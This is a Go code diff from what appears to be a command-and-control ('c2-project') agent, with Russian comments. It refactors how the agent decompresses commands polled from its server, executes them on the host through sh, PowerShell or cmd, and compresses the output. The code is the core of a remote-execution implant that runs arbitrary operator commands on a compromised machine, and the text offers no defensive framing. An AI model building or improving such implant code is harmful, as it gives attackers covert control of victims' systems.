@@ -7,6 +7,7 @@ package main
 import (
 	"bytes"
 	"c2-project/internal/chunk"
+	"c2-project/internal/compress"
 	"c2-project/internal/crypto"
 	"c2-project/internal/jwt"
 	"c2-project/internal/models"
@@ -209,7 +210,7 @@ func pollTasks() (models.Task, error) {
 
 	// Если команда была сжата - распаковываем её.
 	if task.Command != "" {
-		decompressed, err := crypto.Decompress([]byte(task.Command))
+		decompressed, err := compress.Decompress([]byte(task.Command))
 		if err == nil {
 			task.Command = string(decompressed)
 			log.Printf("[TEST] Decompressed command: %s", task.Command)
@@ -221,7 +222,8 @@ func pollTasks() (models.Task, error) {
 
 // executeCommand - выполняет команду в оболочке.
 // Поддерживает пайпы, логические операторы и сложные конструкции.
-// В Linux/Docker используется sh -c, в Windows - cmd /c с конвертацией.
+// В Linux/Docker используется sh -c.
+// В Windows: если есть одиночный пайп (|), но НЕ || — PowerShell, иначе cmd /c.
 func executeCommand(cmd string) (string, error) {
 	if len(strings.TrimSpace(cmd)) == 0 {
 		return "", fmt.Errorf("empty command")
@@ -231,11 +233,35 @@ func executeCommand(cmd string) (string, error) {
 	var err error
 
 	if runtime.GOOS == "windows" {
-		// Windows: используем PowerShell (лучше работает с пайпами)
-		psCmd := exec.Command("powershell", "-Command", cmd)
-		output, err = psCmd.CombinedOutput()
-		if err != nil && len(output) == 0 {
-			// Fallback на cmd /c
+		// Проверяем, есть ли одиночный пайп (|), но НЕ || (логическое ИЛИ)
+		hasPipe := false
+		for i := 0; i < len(cmd); i++ {
+			if cmd[i] == '|' {
+				// Проверяем, что это не || (двойной пайп)
+				if i+1 < len(cmd) && cmd[i+1] == '|' {
+					continue // это ||, пропускаем
+				}
+				if i > 0 && cmd[i-1] == '|' {
+					continue // это ||, пропускаем
+				}
+				hasPipe = true
+				break
+			}
+		}
+
+		if hasPipe {
+			// Используем PowerShell для одиночного пайпа
+			psCmd := cmd
+			psCmd = strings.ReplaceAll(psCmd, " && ", " ; ")
+			psCmd = strings.ReplaceAll(psCmd, " || ", " ; ")
+
+			psExec := exec.Command("powershell", "-Command", psCmd)
+			output, err = psExec.CombinedOutput()
+			if err != nil && len(output) == 0 {
+				return string(output), err
+			}
+		} else {
+			// cmd /c для && и ||
 			cmdCmd := exec.Command("cmd", "/c", cmd)
 			output, err = cmdCmd.CombinedOutput()
 			if err != nil && len(output) == 0 {
@@ -253,7 +279,7 @@ func executeCommand(cmd string) (string, error) {
 
 	// Сжимаем результат только если он длинный (> 5000 байт)
 	if len(output) > 5000 {
-		compressed, err := crypto.Compress(output)
+		compressed, err := compress.Compress(output)
 		if err == nil {
 			return string(compressed), nil
 		}
